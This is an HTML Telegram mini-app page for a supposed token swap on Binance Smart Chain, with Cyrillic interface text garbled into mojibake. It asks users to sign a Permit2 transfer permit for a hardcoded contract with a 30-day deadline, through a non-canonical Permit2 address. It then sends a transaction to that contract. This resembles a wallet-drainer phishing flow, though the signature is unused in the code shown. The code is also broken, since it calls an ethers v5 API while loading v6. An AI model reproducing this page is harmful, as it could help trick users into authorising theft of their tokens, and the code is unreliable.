<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Telegram WebApp Swap</title>
  <!-- Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <!-- WalletConnect Modal & EthereumProvider v2 -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
  <style>
    body { font-family: sans-serif; margin: 20px; background:#17212b; color:#fff; }
    input, button { padding: 8px; margin: 8px 0; width: 100%; max-width: 400px; border-radius:8px; border:none; }
    button { cursor: pointer; background:#2ea6ff; color:#fff; font-weight: 600; }
    #swapBtn:disabled { opacity: 0.5; cursor: not-allowed; background:#555; }
    #status { margin-top: 15px; font-weight: 600; }
    #walletInfo { margin-bottom: 20px; }
  </style>
</head>
<body>
  <h2>Swap via AutoSwap (BSC)</h2>

  <button id="connectBtn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>

  <div id="walletInfo" style="display:none;">
    <div>üü¢ <b>–ê–¥—Ä–µ—Å:</b> <span id="account"></span></div>
    <div>üîó <b>–°–µ—Ç—å:</b> <span id="chain"></span></div>
  </div>

  <input id="tokenIn" type="text" placeholder="–ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞ FROM (ERC20)" value="0x55D398326f99059fF775485246999027B3197955" />
  <input id="tokenOut" type="text" placeholder="–ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞ TO (ERC20)" value="0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f" />
  <input id="amount" type="text" placeholder="–°—É–º–º–∞ (–≤ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –µ–¥–∏–Ω–∏—Ü–∞—Ö)" value="1000000000000000000" />
  <button id="swapBtn" disabled>üîÑ Swap</button>

  <div id="status"></div>

<script>
  // Telegram WebApp ready
  const tg = window.Telegram.WebApp;
  tg.ready();

  // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
  const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
  const BSC_CHAIN_ID = 56;
  const PERMIT2_ADDRESS = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
  const AUTOSWAP_ADDRESS = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";

  // UI —ç–ª–µ–º–µ–Ω—Ç—ã
  const connectBtn = document.getElementById('connectBtn');
  const swapBtn = document.getElementById('swapBtn');
  const accountSpan = document.getElementById('account');
  const chainSpan = document.getElementById('chain');
  const walletInfo = document.getElementById('walletInfo');
  const statusDiv = document.getElementById('status');
  const tokenInInput = document.getElementById('tokenIn');
  const tokenOutInput = document.getElementById('tokenOut');
  const amountInput = document.getElementById('amount');

  // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
  let provider = null;
  let modal = null;
  let accounts = [];
  let chainId = null;

  function updateStatus(msg, isError=false) {
    statusDiv.textContent = msg;
    statusDiv.style.color = isError ? "#e64a45" : "#66bb6a";
  }

  async function initWalletConnect() {
    try {
      updateStatus("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");

      modal = new window.WalletConnectModal.Modal({
        projectId: PROJECT_ID,
        themeMode: "dark",
        walletConnectVersion: 2,
        mobileLinks: ["trust"],
      });

      provider = new window.WalletConnectEthereumProvider({
        projectId: PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        rpcMap: { [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/" },
        showQrModal: false,
      });

      await modal.open();

      accounts = await provider.enable();

      await modal.close();

      chainId = await provider.request({ method: "eth_chainId" });

      accountSpan.textContent = accounts[0];
      chainSpan.textContent = parseInt(chainId, 16);

      walletInfo.style.display = "block";

      if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
        updateStatus(`‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –Ω–∞ —Å–µ—Ç—å Binance Smart Chain (chainId: ${BSC_CHAIN_ID})`, true);
        swapBtn.disabled = true;
      } else {
        updateStatus("–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω. –ú–æ–∂–Ω–æ –¥–µ–ª–∞—Ç—å swap.");
        swapBtn.disabled = false;
      }

      provider.on("accountsChanged", (newAccounts) => {
        accounts = newAccounts;
        accountSpan.textContent = accounts[0] || "";
      });

      provider.on("chainChanged", (newChainId) => {
        chainId = newChainId;
        chainSpan.textContent = parseInt(chainId, 16);
        if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
          updateStatus(`‚ö†Ô∏è –°–º–µ–Ω–∏—Ç–µ —Å–µ—Ç—å –Ω–∞ Binance Smart Chain (${BSC_CHAIN_ID})`, true);
          swapBtn.disabled = true;
        } else {
          updateStatus("–°–µ—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è, –º–æ–∂–Ω–æ –¥–µ–ª–∞—Ç—å swap.");
          swapBtn.disabled = false;
        }
      });
    } catch(e) {
      updateStatus("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è WalletConnect: " + (e.message || e), true);
      console.error(e);
      swapBtn.disabled = true;
    }
  }

  // –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ EIP-712 typed data –¥–ª—è Permit2 (–ø—Ä–∏–º–µ—Ä —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π)
  function buildPermitTypedData(owner, token, amount, spender, nonce, deadline) {
    return {
      types: {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" }
        ]
      },
      primaryType: "PermitTransferFrom",
      domain: {
        name: "Permit2",
        chainId: BSC_CHAIN_ID,
        verifyingContract: PERMIT2_ADDRESS,
      },
      message: {
        permitted: {
          token,
          amount: amount.toString(),
        },
        spender,
        nonce,
        deadline,
      }
    };
  }

  async function doSwap() {
    if (!provider || accounts.length === 0) {
      updateStatus("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.", true);
      return;
    }
    if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
      updateStatus("–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è —Å–µ—Ç—å. –¢—Ä–µ–±—É–µ—Ç—Å—è BSC.", true);
      return;
    }

    const owner = accounts[0];
    const tokenIn = tokenInInput.value.trim();
    const tokenOut = tokenOutInput.value.trim();
    let amount;
    try {
      amount = BigInt(amountInput.value.trim());
    } catch {
      updateStatus("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Å—É–º–º–∞.", true);
      return;
    }
    if (!tokenIn || !tokenOut || amount <= 0n) {
      updateStatus("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –∏ —Å—É–º–º—É.", true);
      return;
    }

    const nonce = BigInt(Date.now());
    const deadline = BigInt(Math.floor(Date.now()/1000) + 86400*30); // 30 –¥–Ω–µ–π

    // –ü–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ typedData –¥–ª—è –ø–æ–¥–ø–∏—Å–∏
    const typedData = buildPermitTypedData(owner, tokenIn, amount, AUTOSWAP_ADDRESS, nonce, deadline);

    // –ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏ –ø–æ EIP-712
    let signature;
    try {
      signature = await provider.request({
        method: "eth_signTypedData_v4",
        params: [owner, JSON.stringify(typedData)]
      });
    } catch(e) {
      updateStatus("–û—à–∏–±–∫–∞ –ø–æ–¥–ø–∏—Å–∏: " + (e.message || e), true);
      return;
    }

    // –§–æ—Ä–º–∏—Ä—É–µ–º data –¥–ª—è –≤—ã–∑–æ–≤–∞ swapForUser (ABI-encoded)
    // –î–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–∏–º —Ç–æ–ª—å–∫–æ –≤—ã–∑–æ–≤ swapForUser(user, amount), –µ—Å–ª–∏ —É –≤–∞—Å –¥—Ä—É–≥–æ–π ABI - –∑–∞–º–µ–Ω–∏—Ç–µ
    // –¢—É—Ç —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ethers.js –∏–ª–∏ web3.js –¥–ª—è –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è, –Ω–æ —á—Ç–æ–±—ã –Ω–µ —É—Å–ª–æ–∂–Ω—è—Ç—å - –ø—Ä–∏–º–µ—Ä –Ω–∏–∂–µ:
    const iface = new ethers.utils.Interface([
      "function swapForUser(address user, uint256 amount)"
    ]);
    const data = iface.encodeFunctionData("swapForUser", [owner, amount.toString()]);

    try {
      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [{
          from: owner,
          to: AUTOSWAP_ADDRESS,
          data
        }]
      });
      updateStatus("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! TxHash: " + txHash);
    } catch(e) {
      updateStatus("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: " + (e.message || e), true);
    }
  }

  connectBtn.addEventListener("click", initWalletConnect);
  swapBtn.addEventListener("click", doSwap);
</script>
<!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º ethers.js CDN –¥–ª—è ABI –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è -->
<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
</body>
</html>